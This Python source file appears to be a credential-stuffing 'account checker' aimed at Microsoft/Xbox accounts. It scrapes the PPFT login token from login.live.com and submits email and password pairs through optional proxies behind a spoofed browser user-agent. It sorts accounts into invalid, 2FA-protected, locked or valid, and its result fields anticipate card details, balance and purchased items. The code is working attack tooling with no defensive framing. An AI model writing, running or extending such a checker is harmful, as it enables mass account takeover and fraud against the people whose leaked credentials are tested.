def extract_between(text, left, right):
    try:
        pattern = re.escape(left) + r'(.*?)' + re.escape(right)
        match = re.search(pattern, text, re.DOTALL)
        if match: return match.group(1).strip()
        return None
    except: return None

def get_ppft_from_page(html):
    ppft = extract_between(html, 'sFTid":"', '"')
    if not ppft: ppft = extract_between(html, 'name="PPFT" id="i0327" value="', '"')
    if not ppft: ppft = extract_between(html, 'name="PPFT" value="', '"')
    if not ppft: ppft = extract_between(html, '"PPFT":"', '"')
    return ppft

def check_xbox_account(email, password, proxy=None, timeout=30):
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
    })
    if proxy:
        session.proxies = {'http': proxy, 'https': proxy}
    try:
        login_url = f"https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=16&ct={int(time.time())}&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2fwww.bing.com%2f&id=264960"
        response = session.get(login_url, timeout=timeout)
        if response.status_code != 200:
            return {'status': 'error', 'message': 'Failed to load login page', 'email': email}
        
        ppft = get_ppft_from_page(response.text) or extract_between(response.text, 'PPFT" value="', '"')
        if not ppft:
            return {'status': 'error', 'message': 'Could not extract PPFT token', 'email': email}
        
        hpgid = extract_between(response.text, 'hpgid" value="', '"') or "0"
        post_url = "https://login.live.com/ppsecure/post.srf"
        payload = {
            'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft,
            'hpgid': hpgid, 'type': '11', 'LoginOptions': '1', 'NewUser': '1',
            'i13': '1', 'ps': '2', 'PPSX': 'PassportRN', 'IsFidoSupported': '1'
        }
        
        response = session.post(post_url, data=payload, allow_redirects=False, timeout=timeout)
        if response.status_code == 302:
            location = response.headers.get('Location', '')
            if 'access_token' in location or 'oauth20_desktop.srf' in location:
                response = session.get(location, allow_redirects=True, timeout=timeout)
            else:
                return {'status': 'error', 'message': 'Unexpected redirect', 'email': email}
        else:
            resp_text = response.text
            if "Your account or password is incorrect" in resp_text or "We couldn't find an account" in resp_text:
                return {'status': 'bad', 'message': 'Invalid credentials', 'email': email}
            if "account.live.com/recover" in resp_text or "identity/confirm" in resp_text:
                return {'status': '2fa', 'message': '2FA verification required', 'email': email}
            if "suspicious activity" in resp_text.lower():
                return {'status': 'locked', 'message': 'Account locked', 'email': email}
            if not any(c.name in ['ANON', 'WLSSC', 'MSPOK'] for c in session.cookies):
                return {'status': 'error', 'message': 'Authentication failed', 'email': email}

        return {
            'status': 'success',
            'message': 'Account checked successfully',
            'email': email,
            'country': 'N/A', 'card_details': 'No Card Found', 'balance': '$0', 'purchased_items': 'None', 'points': '0'
        }
    except Exception as e:
        return {'status': 'error', 'message': str(e), 'email': email}
